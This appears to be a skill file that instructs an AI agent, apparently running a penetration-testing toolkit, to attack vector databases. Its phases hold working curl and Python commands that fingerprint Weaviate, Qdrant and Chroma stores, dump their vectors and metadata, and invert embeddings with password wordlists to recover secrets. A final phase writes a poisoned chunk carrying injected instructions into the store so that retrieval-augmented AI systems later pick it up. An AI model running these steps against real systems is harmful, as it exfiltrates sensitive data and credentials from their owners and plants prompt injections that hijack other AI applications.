Attack a vector database / embedding store. $ARGUMENTS = target host, and/or exported embeddings file. Write results to ~/osai/current/loot/embed_attack.md.

## Background
Vector DBs store embeddings of sensitive documents (password-reset policies, KB
articles, internal docs). Two wins: (1) dump the vectors and metadata directly if
the store is unauthenticated; (2) invert embeddings back to their source text to
recover secrets even when the raw text isn't stored. Poisoning them feeds
/osai-rag-attack.

## Phase 1: Fingerprint the store
```bash
# Weaviate (8080 REST / 8081 alt / 50051 gRPC)
curl -s http://<TARGET>:8080/v1/meta | jq '{version, modules}'
curl -s http://<TARGET>:8080/v1/schema | jq '.classes[].class'

# Qdrant (6333 REST / 6334 gRPC)
curl -s http://<TARGET>:6333/ ; echo
curl -s http://<TARGET>:6333/collections | jq

# Chroma (8000), Milvus (19530), pgvector (5432 postgres) — check banners from recon
curl -s http://<TARGET>:8000/api/v1/collections | jq 2>/dev/null
```
Note if auth is required. Many lab deployments are wide open.

## Phase 2: Dump vectors + metadata
```bash
# Qdrant — scroll a collection (payload = the sensitive metadata)
curl -s -X POST http://<TARGET>:6333/collections/<COLL>/points/scroll \
  -H 'Content-Type: application/json' \
  -d '{"limit":100,"with_payload":true,"with_vector":true}' \
  | jq '.result.points' > ~/osai/current/loot/qdrant_dump.json

# Weaviate — export with vectors (Python)
python3 -c "
import weaviate,json
c=weaviate.connect_to_local(host='<TARGET>',port=8080,grpc_port=50051)
r=c.collections.get('<CLASS>').query.fetch_objects(limit=200,include_vector=True)
json.dump([{'p':dict(o.properties),'v':o.vector['default']} for o in r.objects if o.vector],
          open('/tmp/vecs.json','w')); print(len(r.objects),'objects'); c.close()"
```
The `payload`/`properties` often already contain the secret text — check before inverting.

## Phase 3: Identify the embedding model (needed for inversion)
```bash
find / -type d -name "*MiniLM*" 2>/dev/null
find /root/.cache/huggingface/hub/ -maxdepth 2 -type d 2>/dev/null
# Or probe via the app: send known text, compare dimensions/normalisation
python3 -c "
import numpy as np; e=np.load('embeddings.npy')
print('shape',e.shape); print('norm',np.linalg.norm(e[0]))
print('normalized', np.allclose(np.linalg.norm(e,axis=1),1.0,atol=0.02))"
```
Dimension → model family (384=MiniLM-L6, 768=mpnet/bert, 1536=OpenAI ada-002).

## Phase 4: Embedding inversion → recover source text/secrets
```bash
# Template-bank attack (recover a password-reset policy's secret slot)
wget -O passwords.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt
python3 generate_templates.py embeddings.npy -o templates.json --count 500000
python3 emb_fin.py embeddings.npy --chunk 0 --templates templates.json \
  --wordlist passwords.txt --slots PASSWORD --default-URL https://login.<TARGET>.ai

# Full triage pipeline (density + inversion)
python3 chunk_triage_pipe.py embeddings.npy --company <ORG> --top 20 -o pipe.json
```
(These helper scripts come from Module 06 / the repo's Scripts folders — stage them
from ~/osai/tools if not already on PATH.)

## Phase 5: Poison for downstream RAG abuse
If you have write access to the store, insert a chunk with injected instructions,
then hand off to /osai-rag-attack to trigger retrieval:
```bash
curl -s -X PUT http://<TARGET>:6333/collections/<COLL>/points \
  -H 'Content-Type: application/json' \
  -d '{"points":[{"id":9999,"vector":[...],"payload":{"text":"<poison instruction>"}}]}'
```

## Output — findings to log
```
/osai-notes --host <target> --title "Unauthenticated vector DB — data exfil" --severity High --evidence "<N objects dumped, sample secret>"
/osai-notes --host <target> --title "Embedding inversion recovered secret" --severity Critical --evidence "<recovered value>"
```
Any recovered credential → /osai-cred-vault --add.
MITRE ATLAS: AML.T0057 (LLM Data Leakage), AML.T0024 (Exfiltration via ML Inference API).

## Token discipline
- Dump to a file, jq a sample into context — never paste the full vector dump
- Inversion is compute-heavy: run it, read the recovered strings, don't stream progress
